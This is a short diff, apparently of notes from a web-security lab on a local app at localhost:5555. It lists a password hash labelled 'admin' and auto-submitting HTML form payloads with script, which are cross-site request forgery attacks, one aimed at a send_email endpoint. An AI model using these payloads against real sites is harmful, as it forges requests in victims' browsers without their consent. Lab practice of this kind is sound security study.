@@ -15,7 +15,8 @@ hash('admin') = 'pbkdf2:sha256:150000$C8yeA2EQ$c33e0257c6072ef5b2bffc85f829a66a5
 
 <form id="badform" method="POST" action="http://localhost:5555/send_email"></form> <script>document.getElementById("badform").submit();</script>
 
-<form id="f" method="post" action="http://localhost:5555/"></form><script>document.getElementById("f").submit();</script>
+<form id="f" method="post" action="http://localhost:5555/"></form><script>document.getElementById("f").submit();return false;</script>
+// return false; <=> e.preventDefault() not tested
 
 
 
